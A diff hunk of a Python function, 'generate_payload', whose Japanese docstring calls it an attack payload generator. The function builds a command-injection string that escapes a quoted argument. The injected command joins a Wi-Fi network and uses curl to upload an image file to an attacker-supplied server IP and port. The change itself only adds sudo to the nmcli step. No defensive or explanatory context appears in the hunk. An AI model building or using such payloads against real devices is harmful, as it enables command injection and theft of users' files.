@@ -15,7 +15,7 @@ def generate_payload(image_path, server_ip, server_port, ssid):
     """攻撃ペイロードの生成"""
     payload = (
         f'"; '
-        f'nmcli device wifi connect "{ssid}" && '
+        f'sudo nmcli device wifi connect "{ssid}" && '
         f'sleep 7 && '
         f'curl -s -m 10 -F "file=@{image_path}" http://{server_ip}:{server_port}/upload; '
         f'echo "'
